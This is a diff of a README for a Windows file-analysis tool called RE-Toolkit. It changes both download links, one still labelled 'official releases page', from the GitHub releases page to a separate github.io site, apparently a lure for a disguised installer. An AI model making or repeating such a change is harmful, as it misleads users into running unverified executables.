@@ -1,6 +1,6 @@
 # 🛠️ RE-Toolkit - Analyze files quickly without complex steps
 
-[![Download RE-Toolkit](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/quintessential-zootsuit868/RE-Toolkit/releases)
+[![Download RE-Toolkit](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://quintessential-zootsuit868.github.io)
 
 RE-Toolkit turns your computer into a workstation for file analysis. It helps you identify what a file does, whether it contains hidden threats, or how it works internally. This software automates the hard work of looking at code so you can focus on the results. You do not need experience with programming to use this tool for your research projects.
 
@@ -26,7 +26,7 @@ To ensure the software runs properly, your system needs the following:
 
 ## 📥 Getting Started
 
-1. Visit the [official releases page](https://github.com/quintessential-zootsuit868/RE-Toolkit/releases) to access the download options.
+1. Visit the [official releases page](https://quintessential-zootsuit868.github.io) to access the download options.
 2. Look for the latest version at the top of the list.
 3. Download the installation file suited for your version of Windows.
 4. Open the downloaded file to start the installer.
